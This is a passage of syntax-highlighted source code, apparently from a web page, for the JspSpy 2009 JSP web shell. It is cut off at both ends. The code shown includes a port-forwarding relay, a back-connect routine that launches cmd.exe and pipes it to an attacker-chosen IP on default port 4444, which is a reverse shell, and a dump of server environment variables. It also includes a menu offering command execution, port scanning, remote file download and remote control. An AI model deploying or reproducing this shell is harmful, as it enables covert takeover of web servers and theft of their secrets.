class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> MapPortInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> localIP = <span class="built_in">request</span>.getParameter(<span class="string">"localIP"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> localPort = <span class="built_in">request</span>.getParameter(<span class="string">"localPort"</span>);</span></span><br><span class="line"><span class="vbscript">final <span class="built_in">String</span> remoteIP = <span class="built_in">request</span>.getParameter(<span class="string">"remoteIP"</span>);</span></span><br><span class="line"><span class="vbscript">final <span class="built_in">String</span> remotePort = <span class="built_in">request</span>.getParameter(<span class="string">"remotePort"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(localIP) || Util.<span class="built_in">isEmpty</span>(localPort) || Util.<span class="built_in">isEmpty</span>(remoteIP) || Util.<span class="built_in">isEmpty</span>(remotePort))</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript">Object obj = JSession.getAttribute(PORT_MAP);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (obj != <span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="vbscript">ServerSocket s = (ServerSocket)obj;</span></span><br><span class="line"><span class="vbscript">s.close();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">final ServerSocket <span class="built_in">server</span> = <span class="keyword">new</span> ServerSocket();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">server</span>.bind(<span class="keyword">new</span> InetSocketAddress(localIP,Integer.parseInt(localPort)));</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(PORT_MAP,<span class="built_in">server</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable()&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void run()&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span></span><br><span class="line"><span class="vbscript">Socket soc = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript">Socket remoteSoc = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript">DataInputStream remoteIn = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript">DataOutputStream remoteOut = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript">DataInputStream localIn = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript">DataOutputStream localOut = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript">try&#123;</span></span><br><span class="line"><span class="vbscript">soc = <span class="built_in">server</span>.accept();</span></span><br><span class="line"><span class="vbscript">remoteSoc = <span class="keyword">new</span> Socket();</span></span><br><span class="line"><span class="vbscript">remoteSoc.connect(<span class="keyword">new</span> InetSocketAddress(remoteIP,Integer.parseInt(remotePort)));</span></span><br><span class="line"><span class="vbscript">remoteIn = <span class="keyword">new</span> DataInputStream(remoteSoc.getInputStream());</span></span><br><span class="line"><span class="vbscript">remoteOut = <span class="keyword">new</span> DataOutputStream(remoteSoc.getOutputStream());</span></span><br><span class="line"><span class="vbscript">localIn = <span class="keyword">new</span> DataInputStream(soc.getInputStream());</span></span><br><span class="line"><span class="vbscript">localOut = <span class="keyword">new</span> DataOutputStream(soc.getOutputStream());</span></span><br><span class="line"><span class="vbscript">this.readFromLocal(localIn,remoteOut);</span></span><br><span class="line"><span class="vbscript">this.readFromRemote(soc,remoteSoc,remoteIn,localOut);</span></span><br><span class="line"><span class="vbscript">&#125;catch(Exception ex)</span></span><br><span class="line"><span class="vbscript">&#123;								</span></span><br><span class="line"><span class="vbscript">break;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void readFromLocal(final DataInputStream localIn,final DataOutputStream remoteOut)&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable()&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void run()&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span></span><br><span class="line"><span class="vbscript">try&#123;</span></span><br><span class="line"><span class="vbscript">byte[] data = <span class="keyword">new</span> byte[<span class="number">100</span>];</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> <span class="built_in">len</span> = localIn.read(data);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span> (<span class="built_in">len</span> != <span class="number">-1</span>) &#123;</span></span><br><span class="line"><span class="vbscript">remoteOut.write(data,<span class="number">0</span>,<span class="built_in">len</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">len</span> = localIn.read(data);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">break;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;).start();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void readFromRemote(final Socket soc,final Socket remoteSoc,final DataInputStream remoteIn,final DataOutputStream localOut)&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable()&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void run()&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span></span><br><span class="line"><span class="vbscript">try&#123;</span></span><br><span class="line"><span class="vbscript">byte[] data = <span class="keyword">new</span> byte[<span class="number">100</span>];</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> <span class="built_in">len</span> = remoteIn.read(data);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span> (<span class="built_in">len</span> != <span class="number">-1</span>) &#123;</span></span><br><span class="line"><span class="vbscript">localOut.write(data,<span class="number">0</span>,<span class="built_in">len</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">len</span> = remoteIn.read(data);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">try&#123;</span></span><br><span class="line"><span class="vbscript">soc.close();</span></span><br><span class="line"><span class="vbscript">remoteSoc.close();</span></span><br><span class="line"><span class="vbscript">&#125;catch(Exception ex) &#123;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">break;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;).start();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;).start();</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(<span class="string">"done"</span>,<span class="string">"Map Port Success!"</span>);</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(<span class="string">"localIP"</span>,localIP);</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(<span class="string">"localPort"</span>,localPort);</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(<span class="string">"remoteIP"</span>,remoteIP);</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(<span class="string">"remotePort"</span>,remotePort);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=vmp"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">//VBackConnect</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> VbcInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript">Object ip = JSession.getAttribute(<span class="string">"ip"</span>);</span></span><br><span class="line"><span class="vbscript">Object port = JSession.getAttribute(<span class="string">"port"</span>);</span></span><br><span class="line"><span class="vbscript">Object program = JSession.getAttribute(<span class="string">"program"</span>);</span></span><br><span class="line"><span class="vbscript">Object done = JSession.getAttribute(<span class="string">"done"</span>);</span></span><br><span class="line"><span class="vbscript">JSession.removeAttribute(<span class="string">"ip"</span>);</span></span><br><span class="line"><span class="vbscript">JSession.removeAttribute(<span class="string">"port"</span>);</span></span><br><span class="line"><span class="vbscript">JSession.removeAttribute(<span class="string">"program"</span>);</span></span><br><span class="line"><span class="vbscript">JSession.removeAttribute(<span class="string">"done"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(ip))</span></span><br><span class="line"><span class="vbscript">ip = <span class="built_in">request</span>.getRemoteAddr();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(port) || !Util.isInteger(port.toString()))</span></span><br><span class="line"><span class="vbscript">port = <span class="string">"4444"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(program))</span></span><br><span class="line"><span class="vbscript">program = <span class="string">"cmd.exe"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!Util.<span class="built_in">isEmpty</span>(done))</span></span><br><span class="line"><span class="vbscript">Util.outMsg(out,done.toString());</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;form action=\""+SHELL_NAME+"</span>\<span class="string">" method=\"</span>post\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input type=\"</span>hidden\<span class="string">" name=\"</span>o\<span class="string">" value=\"</span>backConnect\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">15</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"    &lt;td&gt;&lt;h2 id=\"</span>Bin_H2_Title\<span class="string">"&gt;Back Connect &amp;gt;&amp;gt;&lt;/h2&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"      &lt;div id=\"</span>hOWTm\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"      &lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">4</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">" style=\"</span>margin:<span class="number">10</span>px <span class="number">0</span>;\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"      &lt;tr align=\"</span>center\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;td style=\"</span>width:<span class="number">5</span>%\<span class="string">"&gt;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;td  align=\"</span>center\<span class="string">"&gt;Your Ip :"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"          &lt;input name=\"</span>ip\<span class="string">" id=\"</span>ip\<span class="string">" type=\"</span>text\<span class="string">" class=\"</span>input\<span class="string">" size=\"</span><span class="number">20</span>\<span class="string">" value=\""+ip+"</span>\<span class="string">" /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"          Your Port :"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"          &lt;input name=\"</span>port\<span class="string">" id=\"</span>port\<span class="string">" type=\"</span>text\<span class="string">" class=\"</span>input\<span class="string">" size=\"</span><span class="number">20</span>\<span class="string">" value=\""+port+"</span>\<span class="string">" /&gt;Program To Back :"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"          &lt;input name=\"</span>program\<span class="string">" id=\"</span>program\<span class="string">" type=\"</span>text\<span class="string">" value=\""+program+"</span>\<span class="string">" class=\"</span>input\<span class="string">" size=\"</span><span class="number">20</span>\<span class="string">" value=\"</span>d\<span class="string">" /&gt;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"      &lt;/tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"      &lt;tr align=\"</span>center\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;td colspan=\"</span><span class="number">2</span>\<span class="string">"&gt;&lt;br/&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"          &lt;input type=\"</span>submit\<span class="string">" name=\"</span>FJE\<span class="string">" value=\"</span>Connect\<span class="string">" id=\"</span>FJE\<span class="string">" class=\"</span>bt\<span class="string">" /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"    &lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"    &lt;/tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	&lt;/table&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"    &lt;/div&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/table&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/form&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> BackConnectInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> ip = <span class="built_in">request</span>.getParameter(<span class="string">"ip"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> port = <span class="built_in">request</span>.getParameter(<span class="string">"port"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> program = <span class="built_in">request</span>.getParameter(<span class="string">"program"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(ip) || Util.<span class="built_in">isEmpty</span>(program) || !Util.isInteger(port))</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript">Socket socket = <span class="keyword">new</span> Socket(ip,Integer.parseInt(port));</span></span><br><span class="line"><span class="vbscript">Process process = Runtime.getRuntime().exec(program);</span></span><br><span class="line"><span class="vbscript">(<span class="keyword">new</span> StreamConnector(process.getInputStream(), socket.getOutputStream())).start();</span></span><br><span class="line"><span class="vbscript">(<span class="keyword">new</span> StreamConnector(socket.getInputStream(), process.getOutputStream())).start();</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(<span class="string">"done"</span>,<span class="string">"Back Connect Success!"</span>);</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(<span class="string">"ip"</span>,ip);</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(<span class="string">"port"</span>,port);</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(<span class="string">"program"</span>,program);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=vbc"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> JspEnvInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">15</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"      &lt;tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;td&gt;&lt;h2 id=\"</span>Ninty_H2_Title\<span class="string">"&gt;System Properties &amp;gt;&amp;gt;&lt;/h2&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"          &lt;div id=\"</span>ghaB\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"            &lt;hr style=\"</span> border: <span class="number">1</span>px solid #ddd;height:<span class="number">0</span>px;\<span class="string">"/&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"            &lt;ul id=\"</span>Ninty_Ul_Sys\<span class="string">" class=\"</span>info\<span class="string">"&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">Properties pro = System.getProperties();</span></span><br><span class="line"><span class="vbscript">Enumeration names = pro.propertyNames();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span> (names.hasMoreElements())&#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> name = (<span class="built_in">String</span>)names.nextElement();</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;li&gt;&lt;u&gt;"</span>+Util.htmlEncode(name)+<span class="string">" : &lt;/u&gt;"</span>+Util.htmlEncode(pro.getProperty(name))+<span class="string">"&lt;/li&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;/ul&gt;&lt;h2 id=\"</span>Ninty_H2_Mac\<span class="string">"&gt;System Environment &amp;gt;&amp;gt;&lt;/h2&gt;&lt;hr style=\"</span> border: <span class="number">1</span>px solid #ddd;height:<span class="number">0</span>px;\<span class="string">"/&gt;&lt;ul id=\"</span>Ninty_Ul_Sys\<span class="string">" class=\"</span>info\<span class="string">"&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">Map&lt;<span class="built_in">String</span>,<span class="built_in">String</span>&gt; envs = System.getenv();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">Set</span>&lt;Map.Entry&lt;<span class="built_in">String</span>,<span class="built_in">String</span>&gt;&gt; entrySet = envs.entrySet();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">for</span> (Map.Entry&lt;<span class="built_in">String</span>,<span class="built_in">String</span>&gt; en:entrySet) &#123;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;li&gt;&lt;u&gt;"</span>+Util.htmlEncode(en.getKey())+<span class="string">" : &lt;/u&gt;"</span>+Util.htmlEncode(en.getValue())+<span class="string">"&lt;/li&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;/ul&gt;&lt;/div&gt;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"      &lt;/tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"    &lt;/table&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> TopInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;form action=\""+SHELL_NAME+"</span>\<span class="string">" method=\"</span>post\<span class="string">" name=\"</span>doForm\<span class="string">"&gt;&lt;/form&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">0</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	&lt;tr class=\"</span>head\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&lt;td&gt;&lt;span style=\"</span>float:<span class="built_in">right</span>;\<span class="string">"&gt;&lt;a href=\"</span>http://www.forjj.com\<span class="string">" target=\"</span>_blank\<span class="string">"&gt;JspSpy Ver: 2009&lt;/a&gt;&lt;/span&gt;"</span>+<span class="built_in">request</span>.getHeader(<span class="string">"host"</span>)+<span class="string">" ("</span>+InetAddress.getLocalHost().getHostAddress()+<span class="string">")&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	&lt;/tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	&lt;tr class=\"</span>alt1\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&lt;td&gt;&lt;a href=\"</span>javascript:doPost(&#123;o:<span class="comment">'logout'&#125;);\"&gt;Logout&lt;/a&gt; | "+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;a href=\"</span>javascript:doPost(&#123;o:<span class="comment">'fileList'&#125;);\"&gt;File Manager&lt;/a&gt; | "+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;a href=\"</span>javascript:doPost(&#123;o:<span class="comment">'vConn'&#125;);\"&gt;DataBase Manager&lt;/a&gt; | "+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;a href=\"</span>javascript:doPost(&#123;o:<span class="comment">'vs'&#125;);\"&gt;Execute Command&lt;/a&gt; | "+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;a href=\"</span>javascript:doPost(&#123;o:<span class="comment">'vso'&#125;);\"&gt;Shell OnLine&lt;/a&gt; | "+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;a href=\"</span>javascript:doPost(&#123;o:<span class="comment">'vbc'&#125;);\"&gt;Back Connect&lt;/a&gt; | "+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;a href=\"</span>javascript:doPost(&#123;o:<span class="comment">'vPortScan'&#125;);;\"&gt;Port Scan&lt;/a&gt; | "+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;a href=\"</span>javascript:doPost(&#123;o:<span class="comment">'vd'&#125;);\"&gt;Download Remote File&lt;/a&gt; | "+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;a href=\"</span>javascript:;doPost(&#123;o:<span class="comment">'clipboard'&#125;);\"&gt;ClipBoard&lt;/a&gt; | "+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;a href=\"</span>javascript:doPost(&#123;o:<span class="comment">'vRemoteControl'&#125;);\"&gt;Remote Control&lt;/a&gt; | "+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;a href=\"</span>javascript:doPost(&#123;o:<span class="comment">'vmp'&#125;);\"&gt;Port Map&lt;/a&gt; | "+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;a href=\"</span>javascript:doPost(&#123;o:<span class="comment">'jspEnv'&#125;);\"&gt;JSP Env&lt;/a&gt; "+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"	&lt;/tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/table&gt;"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (JSession.getAttribute(MSG) != <span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="vbscript">Util.outMsg(out,JSession.getAttribute(MSG).toString());</span></span><br><span class="line"><span class="vbscript">JSession.removeAttribute(MSG);</span></span><br><span class="line"><span class="vbscript">&#125; </span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> VOnLineShellInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;script&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"				function $(id) &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"					return document.getElementById(id);"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"				&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"				var ie = window.navigator.userAgent.toLowerCase().indexOf(\"</span>msie\<span class="string">") != -1;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"				window.onload = function()&#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"					setInterval(function()&#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						if ($(\"</span>autoscroll\<span class="string">").checked)"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"							var f = window.frames[\"</span>echo\<span class="string">"];"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"							if (f &amp;&amp; f.document &amp;&amp; f.document.body)"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"							&#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"								if (!ie)"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"								&#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"									if (f.document.body.offsetHeight)"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"									&#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"										f.scrollTo(0,parseInt(f.document.body.offsetHeight)+1);"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"									&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"								&#125; else &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"									f.scrollTo(0,parseInt(f.document.body.scrollHeight)+1);"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"								&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"							&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"					